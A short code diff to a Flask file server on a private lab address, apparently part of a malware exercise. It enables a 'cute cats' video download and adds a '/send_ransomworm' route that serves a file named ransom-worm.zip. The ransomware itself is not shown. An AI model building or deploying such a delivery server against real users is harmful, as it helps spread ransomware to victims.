@@ -15,7 +15,8 @@ IP_ADDRESS = "10.0.2.15"
 PORT = 8000
 FILE_TO_SERVE = "./instructions.txt"
 SECRET_KEY = "./private.pem"
-# VIDEO = './cutecats.mp4'
+VIDEO = './cutecats.mp4'
+RANSOM_WORM = './ransom-worm.zip'
 
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
@@ -51,8 +52,11 @@ if __name__ == '__main__':
 
     @app.route('/send_video')
     def send_video():
-        # return send_file(VIDEO, as_attachment=True, mimetype='video/mp4')
-        return send_file('cutecats.mp4', as_attachment=True)
+        return send_file(VIDEO, as_attachment=True)
+
+    @app.route('/send_ransomworm')
+    def send_ransomworm():
+        return send_file(RANSOM_WORM, as_attachment=True)
 
     if __name__ == '__main__':
         app.run(host=IP_ADDRESS, port=PORT, debug=True)
